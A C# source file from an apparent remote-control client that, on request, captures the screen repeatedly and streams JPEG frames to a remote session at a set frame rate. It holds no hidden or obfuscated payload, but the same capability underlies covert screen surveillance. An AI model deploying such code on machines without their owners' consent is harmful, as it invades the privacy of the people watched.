using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestCaptureScreenHandler : AbstractRequestHandler
    {
        private bool _isRunning = false;
        private RequestStartGetScreen _request = null;
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST)
            {
                // 开始捕获
                RequestStartGetScreen req = reqObj as RequestStartGetScreen;
                if (_request == null)
                {
                    // 第一次发送启动监控请求，则创建监控线程
                    _request = req;
                    _isRunning = true;
                    RunTaskThread(StartCaptureScreen, session);
                }
                else
                {
                    // 非第一次发送启动监控请求，则修改相关参数
                    _request.fps = req.fps;
                }
            }
            else if (reqType == ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST)
            {
                // 停止捕获
                _isRunning = false;
            }
        }

        private void StartCaptureScreen(SocketSession session)
        {
            int sleepValue = 1000;
            int fpsValue = 1;
            while (true)
            {
                if (!_isRunning)
                {
                    return;
                }
                fpsValue = _request.fps;
                sleepValue = 1000 / fpsValue;
                for (int i = 0; i < fpsValue; i++)
                {
                    ResponseStartGetScreen resp = new ResponseStartGetScreen();
                    try
                    {
                        resp.SetImage(ScreenUtil.CaptureScreen2(), ImageFormat.Jpeg);
                    }
                    catch (Exception ex)
                    {
                        resp.Result = false;
                        resp.Message = ex.Message;
                        resp.Detail = ex.StackTrace;
                    }
                    session.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE, resp);
                    Thread.Sleep(sleepValue);
                }
            }
        }
    }
}
